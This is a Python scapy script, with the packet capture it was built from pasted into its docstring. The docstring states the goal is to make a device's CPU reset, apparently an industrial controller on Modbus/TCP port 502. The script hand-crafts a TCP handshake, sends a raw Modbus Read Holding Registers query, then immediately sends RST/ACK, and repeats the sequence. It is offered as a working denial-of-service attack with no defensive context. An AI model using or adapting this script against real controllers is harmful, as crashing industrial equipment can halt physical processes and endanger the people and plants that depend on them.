"""
The intent here is to make the CPU reset 


377	20.449975900	0.000414700	192.168.0.100	192.168.0.101	TCP	66			54686 → 502 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=256 SACK_PERM
378	20.452109700	0.002133800	192.168.0.101	192.168.0.100	TCP	60			502 → 54686 [SYN, ACK] Seq=0 Ack=1 Win=5840 Len=0 MSS=1460
379	20.452193700	0.000084000	192.168.0.100	192.168.0.101	TCP	54			54686 → 502 [ACK] Seq=1 Ack=1 Win=65535 Len=0
383	20.463242400	0.000280300	192.168.0.100	192.168.0.101	Modbus/TCP	66	1	Read Holding Registers	   Query: Trans:     1; Unit:   1, Func:   3: Read Holding Registers
384	20.463321200	0.000078800	192.168.0.100	192.168.0.101	TCP	54			54686 → 502 [RST, ACK] Seq=13 Ack=1 Win=0 Len=0
385	20.463798500	0.000477300	192.168.0.100	192.168.0.101	TCP	66			54687 → 502 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=256 SACK_PERM
386	21.466347100	1.002548600	192.168.0.100	192.168.0.101	TCP	66			[TCP Retransmission] 54687 → 502 [SYN] Seq=0 Win=65535 Len=0 MSS=1460 WS=256 SACK_PERM


send sync 
get sync-ack
send ack
send modbus query
send rst-ack

"""
from scapy.all import IP, TCP, Raw, sr1, send

# Configuration based on your packet capture
src_ip = "192.168.0.100"
target_ip = "192.168.0.101"
src_port = 54686
target_port = 502  # Standard Modbus/TCP port

for i in range(2):
    # --- 1. SYN (Packet 377) ---
    syn = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S", seq=0)
    print(f"[*] Sending SYN to {target_ip}:{target_port}...")
    syn_ack = sr1(syn, timeout=2, verbose=0)

    # --- 2. SYN, ACK Validation (Packet 378) ---
    if syn_ack and syn_ack.haslayer(TCP) and syn_ack[TCP].flags == "SA":
        server_seq = syn_ack[TCP].seq
        print(f"[+] Received SYN-ACK. Server Seq: {server_seq}")
        
        # --- 3. ACK (Packet 379) ---
        ack = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="A", seq=1, ack=server_seq + 1)
        send(ack, verbose=0)
        print("[*] Sent ACK. Handshake complete.")
        
        # --- 4. Modbus/TCP Read Holding Registers (Packet 383) ---
        # Constructing the Modbus payload in raw bytes:
        # \x00\x01 = Transaction ID: 1
        # \x00\x00 = Protocol ID: 0 (Modbus)
        # \x00\x06 = Length: 6 bytes follow
        # \x01     = Unit ID: 1
        # \x03     = Function Code: 3 (Read Holding Registers)
        # \x00\x00 = Start Address: 0 (Assumed, as it wasn't specified in the capture)
        # \x00\x01 = Register Count: 1 (Assumed)
        modbus_payload = b"\x00\x01\x00\x00\x00\x06\x01\x03\x00\x00\x00\x01"
        
        # Send data with PSH, ACK flags
        modbus_pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="PA", seq=1, ack=server_seq + 1) / Raw(load=modbus_payload)
        send(modbus_pkt, verbose=0)
        print("[*] Sent Modbus Read Holding Registers Query.")
        
        # --- 5. RST, ACK (Packet 384) ---
        # The payload is 12 bytes long. Therefore, our next sequence number is 1 + 12 = 13.
        rst_pkt = IP(src=src_ip, dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="RA", seq=13, ack=server_seq + 1)
        send(rst_pkt, verbose=0)
        print("[*] Sent RST, ACK to cleanly tear down the connection.")

    else:
        print("[-] Handshake failed. Did not receive SYN-ACK.")